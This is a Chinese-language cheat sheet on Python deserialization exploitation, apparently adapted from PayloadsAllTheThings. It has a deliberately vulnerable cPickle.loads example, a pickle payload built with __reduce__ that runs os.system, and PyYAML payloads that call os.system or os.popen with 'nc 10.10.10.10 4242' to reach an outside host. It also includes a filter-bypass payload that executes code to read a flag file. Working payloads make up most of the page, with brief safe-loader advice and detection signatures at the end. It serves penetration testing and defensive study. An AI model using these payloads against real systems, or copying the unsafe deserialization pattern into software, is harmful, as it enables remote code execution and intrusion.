# Python Deserialization - Python反序列化

[SEARCH_KEYWORDS]
漏洞类型: Python Deserialization Python反序列化 Pickle
攻击类型: RCE Remote Code Execution Arbitrary Code Execution
关键词: pickle cPickle _pickle loads dumps __reduce__ gASV 80 04 95
模块: pickle cPickle _pickle yaml PyYAML ruamel.yaml jsonpickle
技术: __reduce__ Gadget Chain YAML Deserialization

[CONTENT]

## Python反序列化概述

Python反序列化是从序列化数据重建Python对象的过程，常用格式包括JSON、pickle、YAML。pickle模块是最常用的工具，可以序列化和反序列化复杂的Python对象，包括自定义类。

## 危险函数

在Python源代码中查找这些危险点：

- `cPickle.loads`
- `pickle.loads`
- `_pickle.loads`
- `jsonpickle.decode`
- `yaml.load` (非SafeLoader)

## Pickle利用

### 漏洞代码示例

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank = "guest"

# 生成token
h = User()
auth_token = b64encode(cPickle.dumps(h))

# 危险：反序列化用户输入
new_token = raw_input("New Auth Token: ")
token = cPickle.loads(b64decode(new_token))
```

### 恶意Payload构造

```python
import cPickle, os
from base64 import b64encode

class Evil(object):
    def __reduce__(self):
        return (os.system, ("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Evil Token: {}".format(evil_token))
```

### __reduce__方法

`__reduce__`方法返回一个元组`(callable, args)`，反序列化时会执行`callable(*args)`：

```python
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('id',))
```

## PyYAML利用

### 危险YAML Payload

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

### 复杂Payload

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

### 绕过过滤

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

## 安全配置

PyYAML 6.0+版本默认使用SafeLoader：

```python
# 安全
yaml.load(file, Loader=yaml.SafeLoader)

# 危险
yaml.load(file, Loader=yaml.UnsafeLoader)
yaml.unsafe_load(file)
```

## 识别特征

| Header (Hex) | Header (Base64) |
|--------------|-----------------|
| 80 04 95 | gASV |

## 工具

- python-deserialization-attack-payload-generator - 生成pickle/PyYAML payload

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/Python.md